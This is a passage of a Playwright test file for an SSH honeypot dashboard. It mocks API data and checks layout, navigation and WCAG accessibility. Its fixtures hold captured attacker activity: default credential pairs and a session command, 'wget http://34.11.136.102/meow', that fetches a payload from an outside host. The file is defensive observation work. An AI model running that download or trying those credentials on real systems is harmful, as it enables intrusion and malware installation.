import { test, expect, type Page } from '@playwright/test'
import AxeBuilder from '@axe-core/playwright'

// Stub /api/v1/** with deterministic fixtures; keeps e2e hermetic while data-heavy views render real content for accessibility scan.

async function mockApi(page: Page): Promise<void> {
  await page.route('**/api/v1/**', async (route) => {
    const path = new URL(route.request().url()).pathname
    const json = (body: unknown) =>
      route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify(body),
      })

    if (path.endsWith('/stats/totals'))
      return json({ total_sessions: 42, total_auth_attempts: 99, unique_ips: 7 })
    if (path.endsWith('/stats/trend'))
      return json({ current: 42, previous: 30, delta: 12, pct_change: 40 })
    if (path.endsWith('/stats/top-passwords'))
      return json([
        { password: '123456', count: 10 },
        { password: 'root', count: 5 },
      ])
    if (path.endsWith('/stats/top-countries'))
      return json([{ country_code: 'US', country: 'United States', count: 8 }])
    if (path.endsWith('/stats/countries'))
      return json({
        countries: [
          {
            country_code: 'CN',
            country: 'China',
            sessions: 1200,
            distinct_ips: 50,
            attempts: 5000,
            successful: 6,
            success_rate: 0.12,
            distinct_usernames: 30,
            distinct_passwords: 96,
          },
          {
            country_code: 'US',
            country: 'United States',
            sessions: 400,
            distinct_ips: 200,
            attempts: 900,
            successful: 12,
            success_rate: 1.33,
            distinct_usernames: 18,
            distinct_passwords: 60,
          },
          {
            country_code: '??',
            country: 'Unknown',
            sessions: 80,
            distinct_ips: 40,
            attempts: 120,
            successful: 0,
            success_rate: 0,
            distinct_usernames: 5,
            distinct_passwords: 10,
          },
        ],
        total_countries: 2,
        geo_resolved_pct: 81.3,
      })
    if (path.endsWith('/stats/map'))
      return json({
        countries: [
          { a2: 'US', sessions: 400, ips: 200, success_rate: 1.33 },
          { a2: 'CN', sessions: 1200, ips: 50, success_rate: 0.12 },
        ],
        cities: [{ city: 'Amsterdam', lat: 52.4, lon: 4.9, sessions: 100, country_code: 'US' }],
      })
    const countryDetailMatch = path.match(/\/stats\/countries\/([A-Za-z]{2})$/)
    if (countryDetailMatch?.[1]) {
      const a2 = countryDetailMatch[1].toUpperCase()
      if (a2 !== 'US')
        return route.fulfill({
          status: 404,
          contentType: 'application/json',
          body: '{"code":404,"status":"Not Found","message":"Country not found"}',
        })
      return json({
        a2: 'US',
        name: 'United States',
        sessions: 400,
        ips: 200,
        attempts: 900,
        success_rate: 1.33,
        top_asns: [{ asn: 16276, as_org: 'OVH SAS', sessions: 88, distinct_ips: 12 }],
        top_credentials: [{ username: 'root', password: '123456', count: 140, distinct_ips: null }],
        daily: [
          { date: '2026-05-30', sessions: 9 },
          { date: '2026-05-31', sessions: 6 },
        ],
        top_cities: [{ city: 'Amsterdam', lat: 52.4, lon: 4.9, sessions: 100, country_code: 'US' }],
      })
    }
    if (path.endsWith('/stats/asns'))
      return json([
        { asn: 16276, as_org: 'OVH SAS', sessions: 88, distinct_ips: 12 },
        { asn: 4837, as_org: 'China Unicom', sessions: 40, distinct_ips: 8 },
      ])
    if (path.endsWith('/stats/ssh-clients'))
      return json([
        { client_version: 'SSH-2.0-Go', sessions: 252200 },
        { client_version: 'SSH-2.0-libssh_0.9.6', sessions: 54466 },
      ])
    if (path.endsWith('/stats/fingerprints'))
      return json([
        {
          fingerprint: 'd4:98:c4:f3:12:ef:3e:29:38:34:62:21:fd:99:ec:ef',
          fingerprint_type: 'ssh-rsa',
          sessions: 27,
          ips: 21,
          first_seen: '2026-03-10T00:00:00+00:00',
          last_seen: '2026-05-22T00:00:00+00:00',
        },
        {
          fingerprint: '04:c0:35:85:ac:f9:1c:5a:29:58:24:02:02:a7:df:5a',
          fingerprint_type: 'ssh-rsa',
          sessions: 4,
          ips: 1,
          first_seen: '2026-03-14T00:00:00+00:00',
          last_seen: '2026-05-18T00:00:00+00:00',
        },
      ])
    if (path.endsWith('/stats/downloads'))
      return json([
        {
          sha256: '8da193366e1554c08b2870c50f737b9587c3372b656151c4a96028af26f51334',
          name: 'meow',
          sessions: 69,
          first_seen: '2026-06-03T00:00:00+00:00',
          last_seen: '2026-07-23T00:00:00+00:00',
          machines: 4,
          countries: ['US', 'RU', 'CN'],
          host: null,
        },
        {
          sha256: '249512a11240bba571d1a474eb9e440249512a11240bba571d1a474eb9e4402',
          name: null,
          sessions: 1,
          machines: 1,
          first_seen: null,
          last_seen: null,
          countries: [],
          host: null,
        },
      ])
    if (path.endsWith('/stats/outcomes'))
      return json({
        shell: 120,
        commands: 40,
        tcpip: 30,
        downloads: 2,
        none: 8,
        total: 1000,
      })
    if (path.endsWith('/stats/tcpip-destinations'))
      return json([
        {
          network: 'Cloudflare',
          port: 53,
          sessions: 2933,
          hosts: 1,
          country: 'United States',
          country_code: 'US',
        },
        {
          network: 'ip-who.com',
          port: 80,
          sessions: 280,
          hosts: 4,
          country: null,
          country_code: null,
        },
        { network: null, port: 25, sessions: 12, hosts: 2, country: null, country_code: null },
      ])
    if (path.endsWith('/stats/activity'))
      return json([
        { bucket: '2026-05-29T00:00:00+00:00', count: 4 },
        { bucket: '2026-05-30T00:00:00+00:00', count: 9 },
        { bucket: '2026-05-31T00:00:00+00:00', count: 6 },
      ])
    if (path.endsWith('/stats/heatmap'))
      return json([
        { weekday: 0, hour: 13, count: 7 }, // Sunday = 0
        { weekday: 2, hour: 14, count: 12 },
      ])
    if (path.endsWith('/stats/top-credentials')) {
      const q = new URL(route.request().url()).searchParams
      if (q.get('outcome') === 'success')
        return json([{ username: 'root', password: 'toor', count: 3, distinct_ips: null }])
      if (q.get('metric') === 'ip_fanout')
        return json([
          { username: 'root', password: 'xc3511', count: 400, distinct_ips: 37 },
          { username: 'admin', password: 'admin', count: 120, distinct_ips: 1 },
        ])
      if (q.get('by') === 'password')
        return json([
          { username: null, password: 'hunter2', count: 64, distinct_ips: null },
          { username: null, password: '123456', count: 30, distinct_ips: null },
        ])
      if (q.get('by') === 'username')
        return json([
          { username: 'root', password: null, count: 220, distinct_ips: null },
          { username: 'admin', password: null, count: 90, distinct_ips: null },
        ])
      return json([
        { username: 'root', password: '123456', count: 140, distinct_ips: null },
        { username: 'admin', password: 'admin', count: 90, distinct_ips: null },
      ])
    }
    if (path.endsWith('/stats/auth-outcomes'))
      return json({
        total: 99,
        successful: 4,
        failed: 95,
        success_rate: 4.04,
        unique_passwords: 61,
        unique_usernames: 18,
      })
    if (path.endsWith('/stats/password-composition'))
      return json({
        total: 99,
        capped_at: 16,
        lengths: [
          { length: 4, count: 10 },
          { length: 6, count: 40 },
          { length: 8, count: 20 },
          { length: 16, count: 5 },
        ],
        classes: [
          { name: 'digits', count: 50 },
          { name: 'lower', count: 30 },
          { name: 'alnum', count: 19 },
        ],
      })
    if (path.endsWith('/stats/passwords-by-length'))
      return json([
        { password: '123456', count: 12 },
        { password: 'qwerty', count: 4 },
      ])
    // List endpoint has trailing slash; detail does not.
    if (path.endsWith('/sessions/'))
      return json({
        items: [
          {
            id: '726faaebd6b9',
            src_port: 45214,
            dst_port: 2222,
            protocol: 'ssh',
            country: 'United States',
            country_code: 'US',
            started_at: '2026-05-31T13:40:52+00:00',
            ended_at: '2026-05-31T13:41:50+00:00',
            auth_attempt_count: 1,
            command_count: 2,
            has_successful_login: true,
            category: 'active',
            n_commands: 2,
            n_downloads: 1,
            n_tcpip: 0,
            auth_success: true,
            interest: 12,
            asn_org: 'OVH SAS',
            client_version: 'SSH-2.0-libssh_0.9.6',
          },
        ],
        meta: { page: 1, pages: 1, per_page: 25, total: 1 },
      })
    const sessionMatch = path.match(/\/sessions\/([^/]+)$/)
    if (sessionMatch)
      return json({
        id: sessionMatch[1],
        src_port: 45214,
        dst_port: 2222,
        protocol: 'ssh',
        sensor: 'edge-01',
        country: 'United States',
        country_code: 'US',
        started_at: '2026-05-31T13:40:52+00:00',
        ended_at: '2026-05-31T13:41:50+00:00',
        interest: 12,
        max_interest: 20,
        auth_attempts: [
          {
            id: 1,
            username: 'admin',
            password: 'admin',
            success: true,
            timestamp: '2026-05-31T13:41:38+00:00',
          },
          ...Array.from({ length: 19 }, (_, i) => ({
            id: i + 2,
            username: `sprayed${i}`,
            password: `pw${i}`,
            success: false,
            timestamp: '2026-05-31T13:41:38+00:00',
          })),
        ],
        commands: [
          { id: 10, input: 'whoami', success: true, timestamp: '2026-05-31T13:41:49+00:00' },
          {
            id: 11,
            input: 'wget http://34.11.136.102/meow',
            success: true,
            timestamp: '2026-05-31T13:41:49+00:00',
          },
        ],
        downloads: [
          {
            id: 1,
            url: 'http://34.11.136.102/meow',
            sha256: '8da193366e1554c08b2870c50f737b9587c3372b656151c4a96028af26f51334',
            timestamp: '2026-05-31T13:41:51+00:00',
          },
        ],
      })

    return route.fulfill({
      status: 404,
      contentType: 'application/json',
      body: '{"code":404,"status":"Not Found","message":"Not Found"}',
    })
  })
}

// Dismiss the about overlay to avoid interference with axe scans and click targets.
async function dismissIntro(page: Page): Promise<void> {
  await page.getByRole('button', { name: 'Enter', exact: true }).click()
  await expect(page.getByRole('dialog', { name: 'About Honeywatch' })).toBeHidden()
}

// Serve a server-folded sessions list: items[runFrom] carries the rest of the run (items after it) behind it.
async function mockFoldedSessions(
  page: Page,
  items: Record<string, unknown>[],
  runFrom: number,
  perPage = 40,
): Promise<void> {
  const members = items.slice(runFrom + 1)
  const shown = items.slice(0, runFrom + 1).map((it, i) =>
    i < runFrom
      ? it
      : {
          ...it,
          run: {
            count: members.length,
            offset: runFrom + 1,
            countries: 1,
            country_code: 'US',
            country: 'United States',
            min_duration_s: 58,
            max_duration_s: 58,
            oldest: '2026-05-31T13:40:52+00:00',
            newest: '2026-05-31T13:40:52+00:00',
          },
        },
  )
  const fulfil = (body: unknown) => ({
    status: 200,
    contentType: 'application/json',
    body: JSON.stringify(body),
  })
  await page.route(/\/api\/v1\/sessions\/run\?/, (route) =>
    route.fulfill(
      fulfil({
        items: members,
        meta: { page: 1, per_page: 40, pages: 1, total: members.length },
      }),
    ),
  )
  await page.route(/\/api\/v1\/sessions\/(\?|$)/, (route) =>
    route.fulfill(
      fulfil({
        items: shown,
        as_of: '2026-06-01T00:00:00+00:00',
        max_interest: 20,
        meta: { page: 1, pages: 1, per_page: perPage, total: items.length },
      }),
    ),
  )
}

// A valid summary row for the phone list (a probe unless `over` says otherwise).
const sessionItem = (id: string, over: Record<string, unknown> = {}) => ({
  id,
  src_port: 45214,
  dst_port: 2222,
  protocol: 'ssh',
  country: 'United States',
  country_code: 'US',
  city: 'Ashburn',
  started_at: '2026-05-31T13:40:52+00:00',
  ended_at: '2026-05-31T13:41:50+00:00',
  auth_attempt_count: 1,
  command_count: 0,
  has_successful_login: false,
  category: 'probe',
  n_commands: 0,
  n_downloads: 0,
  n_tcpip: 0,
  auth_success: false,
  interest: 1,
  asn_org: 'OVH SAS',
  client_version: 'SSH-2.0-Go',
  ...over,
})

async function expectAxeClean(page: Page): Promise<void> {
  // The loading splash covers the page and animates; wait until it is gone, then scan.
  await expect(page.locator('#hw-splash')).toHaveCount(0)
  // Mid-transition, colors interpolate and fail contrast checks on elements that are fine at rest.
  // Infinite keyframe animations never finish, so only CSS transitions are awaited.
  await page.waitForFunction(() =>
    document
      .getAnimations()
      .every((a) => !(a instanceof CSSTransition) || a.playState === 'finished'),
  )
  const results = await new AxeBuilder({ page })
    .withTags(['wcag2a', 'wcag2aa', 'wcag21aa'])
    .analyze()
  // Map to rule ids for a readable failure message instead of a giant object.
  expect(results.violations.map((v) => v.id)).toEqual([])
}

test.describe('dashboard accessibility smoke', () => {
  test.beforeEach(async ({ page }) => {
    await mockApi(page)
  })

  test('overview renders data and is axe-clean', async ({ page }) => {
    await page.goto('/')
    await dismissIntro(page)
    await expect(
      page.getByRole('img', { name: /World map of where attacks on the honeypot come from/i }),
    ).toBeVisible()
    await expect(page.locator('.stat-tile', { hasText: 'Sessions' })).toBeVisible()
    await expect(page.getByRole('heading', { name: /Live sessions/ })).toBeVisible()
    await expectAxeClean(page)
  })

  test('credentials (redesigned) renders the comb, what worked, and password anatomy, axe-clean', async ({
    page,
  }) => {
    await page.goto('/credentials')
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Credentials' })).toBeVisible()
    await expect(
      page.getByRole('heading', { level: 2, name: /Username and password pairs/ }),
    ).toBeVisible()
    await expect(page.getByRole('heading', { level: 2, name: 'What worked' })).toBeVisible()
    await expect(page.getByText('root:toor')).toBeVisible()

    await expect(page.getByRole('heading', { level: 2, name: 'Password anatomy' })).toBeVisible()

    // Drill into a length bucket; the view swap (no in-place reflow) must
    // clear hover tooltips to avoid a stale freeze-on-click.
    await page.getByRole('button', { name: /8 characters/ }).click()
    const drill = page.locator('.drill')
    await expect(drill.locator('.rk-label').nth(0)).toContainText('123456')
    await expect(drill.locator('.rk-label').nth(1)).toContainText('qwerty')
    const back = page.getByRole('button', { name: /Anatomy/ })
    await expect(back).toBeVisible()
    await expect(page.getByRole('tooltip')).toHaveCount(0)

    await expectAxeClean(page)

    await back.click()
    await expect(page.getByRole('button', { name: /8 characters/ })).toBeVisible()
  })

  test('phone credentials matrix has fewer columns than desktop and no overlapping labels', async ({
    page,
  }) => {
    const names = ['root', 'admin', 'user', 'test', 'guest', 'oracle', 'pi', 'ubuntu']
    const pwds = [
      '123456',
      'password',
      'admin',
      'qwerty',
      'letmein',
      'toor',
      'root',
      'welcome',
      'abc123',
      'default',
    ]
    const pairs = names.flatMap((u, i) =>
      pwds.map((p, j) => ({
        username: u,
        password: p,
        count: 100 - i * 5 - j * 3,
        distinct_ips: null,
      })),
    )
    await page.route('**/api/v1/stats/top-credentials**', (route) => {
      const q = new URL(route.request().url()).searchParams
      if (q.get('outcome') === 'success' || q.get('metric') === 'ip_fanout') return route.fallback()
      const body =
        q.get('by') === 'username'
          ? names.map((u, i) => ({
              username: u,
              password: null,
              count: 200 - i * 10,
              distinct_ips: null,
            }))
          : q.get('by') === 'password'
            ? pwds.map((p, j) => ({
                username: null,
                password: p,
                count: 200 - j * 10,
                distinct_ips: null,
              }))
            : pairs
      return route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify(body),
      })
    })
    const svg = page.locator('svg.hex-matrix')
    const columns = () => svg.locator('text.mx-axis[transform^="rotate"]')

    await page.setViewportSize({ width: 1280, height: 900 })
    await page.goto('/credentials')
    await dismissIntro(page)
    await expect(svg).toBeVisible()
    await expect(columns().first()).toBeVisible()
    const desktopCols = await columns().count()

    await page.setViewportSize({ width: 390, height: 844 })
    await page.reload()
    await expect(columns().first()).toBeVisible()
    await expect.poll(() => columns().count()).toBeLessThanOrEqual(5)
    const phoneCols = await columns().count()
    expect(phoneCols).toBeGreaterThan(0)
    expect(phoneCols).toBeLessThan(desktopCols)

    const boxes = []
    for (let i = 0; i < phoneCols; i++) {
      const b = await columns().nth(i).boundingBox()
      expect(b).not.toBeNull()
      boxes.push(b!)
    }
    for (let i = 0; i < boxes.length; i++)
      for (let j = i + 1; j < boxes.length; j++) {
        const A = boxes[i]!
        const B = boxes[j]!
        const hit =
          A.x < B.x + B.width && B.x < A.x + A.width && A.y < B.y + B.height && B.y < A.y + A.height
        expect(hit, `x labels ${i} and ${j} overlap`).toBe(false)
      }
  })

  test('origins renders the hive, drills into a country, toggles table and keys, axe-clean', async ({
    page,
  }) => {
    await page.goto('/origins')
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Origins' })).toBeVisible()
    await expect(page.getByRole('button', { name: /China/ })).toBeVisible()
    // Geo-less "Unknown" (?? sentinel) never gets a hex or a rank row.
    await expect(page.getByRole('button', { name: /Unknown/ })).toHaveCount(0)

    await page.getByRole('button', { name: /China/ }).click()
    // Focus moves into drawer on open (WCAG 2.4.3), hiding cell hover tooltips, so assert URL instead.
    // Close the drawer to avoid covering the Networks/SSH cards below.
    await expect(page).toHaveURL(/country=CN/)
    await page.keyboard.press('Escape')
    await expect(page).not.toHaveURL(/country=/)

    await page.getByRole('button', { name: 'Table', exact: true }).click()
    await expect(page.getByRole('table')).toBeVisible()

    // Mock ignores query params, so assert outgoing request has sort key (row order would falsely pass without refetch).
    // Verify aria-sort attribute moved.
    const sorted = page.waitForRequest(
      (r) => r.url().includes('/stats/countries') && r.url().includes('sort=ips'),
    )
    await page.getByRole('button', { name: 'Unique IPs' }).click()
    await sorted
    await expect(page.getByRole('columnheader', { name: 'Unique IPs' })).toHaveAttribute(
      'aria-sort',
      'descending',
    )

    await expectAxeClean(page)
    await expect(page.getByRole('button', { name: 'Hive', exact: true })).toBeVisible()
    await page.getByRole('button', { name: 'Hive', exact: true }).click()

    await expect(page.getByText('OVH SAS')).toBeVisible()

    await page.getByRole('button', { name: 'Reused keys', exact: true }).click()
    await expect(page.getByText(/d4:98:c4:f3/)).toBeVisible()

    await expectAxeClean(page)
  })

  test('payloads renders specimens, provenance KPI, and relay table, axe-clean', async ({
    page,
  }) => {
    await page.goto('/payloads')
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Payloads' })).toBeVisible()
    await expect(page.getByText('69 sessions from just 4 machines.')).toBeVisible()
    await expect(page.getByText(/Seen once, on/)).toBeVisible()
    await expect(page.getByText('Where payloads are hosted')).toHaveCount(0)
    await expect(page.getByText('Source URL recorded')).toHaveCount(0)
    await expect(page.getByText('Sessions that fetched a file')).toBeVisible()
    // The tile keeps the full sentence on desktop and a short form on a phone.
    await expect(
      page.getByText(
        test.info().project.name === 'mobile-chromium'
          ? '1 in 60 sessions'
          : '1 in 60 of the 120 that got control',
        { exact: true },
      ),
    ).toBeVisible()
    await expect(page.getByRole('heading', { level: 2, name: 'Relay attempts' })).toBeVisible()
    await expect(page.getByText('ip-who.com')).toBeVisible()
    await expect(page.getByText('Unknown network')).toBeVisible()
    await expect(page.locator('.head-sha', { hasText: '249512a11240' })).toBeVisible()
    await expect(page.locator('.specimens .spec')).toHaveCount(2)
    // The whole card navigates to the sessions that captured this payload.
    // The overlay is a pseudo-element, so the VirusTotal anchor stays a
    // sibling - nesting them would be invalid HTML.
    await expect(page.locator('.spec').first().locator('a.spec-link')).toHaveAttribute(
      'href',
      /\/sessions\?sha256=8da193366e1554c08b2870c50f737b9587c3372b656151c4a96028af26f51334/,
    )
    await expect(page.locator('.spec').first().locator('a.vt')).toHaveCount(0)

    await expectAxeClean(page)
  })

  test('payloads on a phone lists 8 specimens until Show all, with no sideways scroll', async ({
    page,
  }) => {
    test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
    await page.route(/\/api\/v1\/stats\/downloads/, (route) =>
      route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify(
          Array.from({ length: 12 }, (_, i) => ({
            sha256: String(i).padStart(2, '0').repeat(32),
            name: `file${i}`,
            sessions: 20 - i,
            machines: 2,
            first_seen: null,
            last_seen: null,
            countries: [],
            host: null,
          })),
        ),
      }),
    )
    await page.goto('/payloads')
    await dismissIntro(page)
    const cards = page.locator('.specimens .spec')
    await expect(cards.first()).toBeVisible()
    expect(
      await cards.evaluateAll((els) => els.filter((e) => e.getClientRects().length).length),
    ).toBe(8)
    await page.getByRole('button', { name: 'Show all 12' }).click()
    expect(
      await cards.evaluateAll((els) => els.filter((e) => e.getClientRects().length).length),
    ).toBe(12)
    expect(
      await page.evaluate(
        () => document.documentElement.scrollWidth <= document.documentElement.clientWidth,
      ),
    ).toBe(true)
  })

  test('overview: selecting a country opens the intel drawer', async ({ page }) => {
    await page.goto('/')
    await dismissIntro(page)
    // SVG paths are the visual target; test the keyboard path (focus+Enter).
    // Scoped to the map itself - the live-sessions feed also has a button
    // mentioning "United States" (its own, differently-labeled entry), which
    // is correct/expected UI, not a bug to work around.
    const drill = page.locator('svg.worldmap').getByRole('button', { name: /United States/ })
    await drill.focus()
    await page.keyboard.press('Enter')
    await expect(page).toHaveURL(/country=US/)
    await expect(page.getByRole('heading', { level: 2, name: 'United States' })).toBeVisible()
    await expect(page.getByText('OVH SAS')).toBeVisible()
    await expectAxeClean(page)

    // Opening the drawer must move focus into it: otherwise a keyboard user has
    // to tab past every remaining country path to reach Close (measured at 14
    // presses in a two-country mock, hundreds with real data).
    await expect(page.getByRole('button', { name: 'Close' })).toBeFocused()

    await page.keyboard.press('Escape')
    await expect(page).not.toHaveURL(/country=/)
    // ...and focus returns to the country that opened it, rather than being
    // dropped on document.body where the next Tab restarts from the top.
    expect(await page.evaluate(() => document.activeElement?.tagName)).not.toBe('BODY')
  })

  test('overview: city dots meet the 24px minimum tap target', async ({ page }) => {
    await page.goto('/')
    await dismissIntro(page)
    // WCAG 2.5.8. Hit circles are sized in viewBox units, so on a 390px-wide
    // phone the whole 1600-unit viewBox is 0.24 CSS px per unit - without a
    // floor these come out at 2-3 px.
    const hit = page.locator('svg.worldmap .city-hit').first()
    await expect(hit).toBeAttached()
    const box = await hit.boundingBox()
    expect(box).not.toBeNull()
    expect(box!.width).toBeGreaterThanOrEqual(24)
    expect(box!.height).toBeGreaterThanOrEqual(24)
  })

  test('overview: the world cannot be dragged off screen at min zoom', async ({ page }) => {
    await page.goto('/')
    await dismissIntro(page)
    const scene = page.locator('svg.worldmap > g')
    // Mobile opens zoomed on Europe and Home returns there, so zoom out step by
    // step to the world view - this test is specifically about the clamp at k = minK.
    const zoomOut = page.getByRole('button', { name: 'Zoom out' })
    // Each click is an animated tween that ignores nothing but may overlap, so
    // click, let it settle, and stop once a click no longer changes the view.
    let last = ''
    for (let i = 0; i < 20; i++) {
      await zoomOut.click()
      await page.waitForTimeout(400)
      const now = (await scene.getAttribute('transform')) ?? ''
      if (now === last) break
      last = now
    }
    const before = await scene.getAttribute('transform')
    await page.locator('svg.worldmap').hover()
    await page.mouse.down()
    await page.mouse.move(2000, 1200, { steps: 10 })
    await page.mouse.up()
    // At k = minK the legal pan interval is a single point, so a drag is a
    // no-op. This fails for any future code path that writes tx/ty without
    // going through usePanZoom's commit().
    expect(await scene.getAttribute('transform')).toBe(before)
  })

  test('SPA navigation from overview to credentials renders without an error', async ({ page }) => {
    await page.goto('/')
    await dismissIntro(page)
    await page
      .getByRole('navigation', { name: 'Main' })
      .getByRole('link', { name: /Credentials/ })
      .click()
    await expect(page).toHaveURL(/\/credentials/)
    await expect(page.getByRole('heading', { level: 1, name: 'Credentials' })).toBeVisible()
    await expect(page.getByRole('alert')).toHaveCount(0)
    await expect(page.getByText('Something went wrong')).toHaveCount(0)
  })

  test('a forced view error shows the error state and no loading splash', async ({ page }) => {
    await page.route('**/api/v1/stats/top-credentials**', (route) =>
      route.fulfill({
        status: 400,
        contentType: 'application/json',
        body: '{"code":400,"status":"Bad Request","message":"nope"}',
      }),
    )
    await page.goto('/credentials')
    const alert = page.getByRole('alert')
    await expect(alert).toBeVisible({ timeout: 15_000 })
    await expect(alert).toContainText('Something went wrong')
    await expect(alert.getByRole('button', { name: 'Try again' })).toBeVisible()
    await expect(page.locator('#hw-splash')).toHaveCount(0)
  })

  test('leaving a session replay for credentials neither crashes nor fetches an empty id', async ({
    page,
  }) => {
    // The generated client sends a bare /api/v1/sessions/ only for an empty id. List calls carry
    // query parameters, so requiring an empty search leaves them out of the check.
    const isEmptyIdFetch = (url: URL) =>
      url.pathname === '/api/v1/sessions/' && url.search === ''
    const detailFetches: string[] = []
    const emptyIdRequests: string[] = []
    page.on('request', (r) => {
      const url = new URL(r.url())
      if (url.pathname.startsWith('/api/v1/sessions/')) detailFetches.push(url.pathname)
      if (isEmptyIdFetch(url)) emptyIdRequests.push(r.url())
    })
    await page.goto('/sessions/726faaebd6b9')
    await dismissIntro(page)
    await expect(page.getByRole('region', { name: /^Replay of the/i })).toBeVisible()
    // Positive control: the listener sees real detail fetches, so a clean run is not vacuous.
    expect(detailFetches).toContain('/api/v1/sessions/726faaebd6b9')
    emptyIdRequests.length = 0
    await page.locator('a[href="/credentials"]').first().click({ delay: 120 })
    await expect(page).toHaveURL(/\/credentials/)
    await expect(page.getByRole('heading', { level: 1, name: 'Credentials' })).toBeVisible()
    await expect(page.getByText('Something went wrong')).toHaveCount(0)
    expect(emptyIdRequests).toEqual([])
  })

  test('a view error inside the fallback delay leaves no loader, also after Try again', async ({
    page,
  }) => {
    await page.goto('/')
    await dismissIntro(page)
    await page.route('**/api/v1/stats/password-composition*', (route) =>
      route.fulfill({
        status: 400,
        contentType: 'application/json',
        body: '{"code":400,"status":"Bad Request","message":"nope"}',
      }),
    )
    await page.locator('a[href="/credentials"]').first().click({ delay: 120 })
    await page.waitForTimeout(400)
    await expect(page.locator('[role=alert]')).toHaveCount(1)
    await expect(page.locator('.loading')).toHaveCount(0)
    await expect(page.locator('#hw-splash')).toHaveCount(0)
    await page.getByRole('button', { name: 'Try again' }).click()
    await page.waitForTimeout(600)
    await expect(page.locator('[role=alert]')).toHaveCount(1)
    await expect(page.locator('.loading')).toHaveCount(0)
    await expect(page.locator('#hw-splash')).toHaveCount(0)
  })

  test('phone shows the brand wordmark and a GitHub link', async ({ page }) => {
    test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
    await page.goto('/')
    await dismissIntro(page)
    const brand = page.getByRole('link', { name: 'Honeywatch', exact: true })
    await expect(brand.getByText('Honeywatch')).toBeVisible()
    await expect(page.getByRole('link', { name: 'GitHub', exact: true })).toBeVisible()
  })

  test('not-found renders and is axe-clean', async ({ page }) => {
    await page.goto('/this-route-does-not-exist')
    // Dismiss the overlay to avoid axe flakes during mid-fade snapshots.
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Page not found' })).toBeVisible()
    await expectAxeClean(page)
  })

  test('pulse renders the rhythm honeycomb and daily columns, filters by country, axe-clean', async ({
    page,
  }) => {
    await page.goto('/pulse')
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Pulse' })).toBeVisible()
    await expect(page.getByRole('heading', { level: 2, name: /Session rhythm/ })).toBeVisible()
    await expect(page.getByRole('heading', { level: 2, name: 'Daily sessions' })).toBeVisible()
    await expect(page.getByRole('heading', { level: 2, name: 'Readings' })).toBeVisible()

    await page.getByRole('button', { name: 'Country filter' }).click()
    await page.getByRole('option', { name: 'United States' }).click()
    await expect(page).toHaveURL(/country=US/)

    await expectAxeClean(page)

    await page.getByRole('link', { name: 'About' }).click()
    await expect(page.getByRole('dialog', { name: 'About Honeywatch' })).toBeVisible()
  })

  test('/activity redirects to /pulse', async ({ page }) => {
    await page.goto('/activity')
    await expect(page).toHaveURL(/\/pulse$/)
    await expect(page.getByRole('heading', { level: 1, name: 'Pulse' })).toBeVisible()
  })

  test('/countries redirects to /origins', async ({ page }) => {
    await page.goto('/countries')
    await expect(page).toHaveURL(/\/origins$/)
    await expect(page.getByRole('heading', { level: 1, name: 'Origins' })).toBeVisible()
  })

  test('sessions list expands a row and opens the full replay, IPs blotted, axe-clean', async ({
    page,
  }) => {
    test.skip(test.info().project.name === 'mobile-chromium', 'table layout is desktop only')
    await page.goto('/sessions')
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Sessions' })).toBeVisible()
    await expectAxeClean(page)

    // Rows expand in place (never navigate away) - the plan's core Sessions requirement.
    // The row is a treegrid row, not a button, and its accessible name is
    // prose ("Session from ...") - the 12-char id is deliberately decorative,
    // so filter on the visible text rather than the accessible name.
    const row = page.getByRole('row').filter({ hasText: '726faaebd6b9' })
    await row.click()
    await expect(row).toHaveAttribute('aria-expanded', 'true')

    const term = page.getByRole('log', { name: /transcript/i })
    await expect(term).toBeVisible()
    await expect(term).toContainText('whoami')
    await expect(term).toContainText('<ip>')
    await expect(term).not.toContainText('34.11.136.102')

    // The action button belongs to the transcript beside it, so the two
    // columns must end on the same line however long the credential spray is.
    // Desktop only - below 760px the panel deliberately stacks into one column.
    if (test.info().project.name !== 'mobile-chromium') {
      const bottoms = await page.evaluate(() => {
        const term = document.querySelector('.term')
        const actions = document.querySelector('.detail-actions')
        if (!term || !actions) return null
        return {
          term: Math.round(term.getBoundingClientRect().bottom),
          actions: Math.round(actions.getBoundingClientRect().bottom),
        }
      })
      expect(bottoms).not.toBeNull()
      expect(bottoms!.actions).toBe(bottoms!.term)
    }

    await expectAxeClean(page)

    // "Replay" is the explicit escape hatch to the full-page replay.
    await page.getByRole('link', { name: /^Replay/ }).click()
    await expect(page).toHaveURL(/\/sessions\/726faaebd6b9/)
    const replay = page.getByRole('region', { name: /^Replay of the/i })
    await expect(replay).toBeVisible()
    await expect(replay).toContainText('<ip>')
    await expect(replay).not.toContainText('34.11.136.102')
    await expect(replay.getByRole('img', { name: /^Interest score/ })).toBeVisible()
    await expectAxeClean(page)
  })

  test('phone: the sessions list is axe-clean and a tapped row opens its replay, IPs blotted', async ({
    page,
  }) => {
    test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
    await page.goto('/sessions')
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Sessions' })).toBeVisible()
    // The link is named in prose; the id on screen is the first 8 characters of the 12.
    const row = page.getByRole('link', { name: /^726faaeb,/ })
    await expect(row).toBeVisible()
    await expectAxeClean(page)

    await row.click({ delay: 120 })
    await expect(page).toHaveURL(/\/sessions\/726faaebd6b9$/)
    await expect(page.locator('tr.expand')).toHaveCount(0)
    const replay = page.getByRole('region', { name: /^Replay of the/i })
    await expect(replay).toBeVisible()
    await expect(replay).toContainText('<ip>')
    await expect(replay).not.toContainText('34.11.136.102')
    await expect(replay.getByRole('img', { name: /^Interest score/ })).toBeVisible()
    await expect(page.getByText('726faaebd6b9').first()).toBeVisible()
    await expectAxeClean(page)
  })

  test('sessions folds identical sessions into a group row that expands', async ({ page }) => {
    test.skip(test.info().project.name === 'mobile-chromium', 'table layout is desktop only')
    const item = (id: string) => ({
      id,
      src_port: 45214,
      dst_port: 2222,
      protocol: 'ssh',
      country: 'United States',
      country_code: 'US',
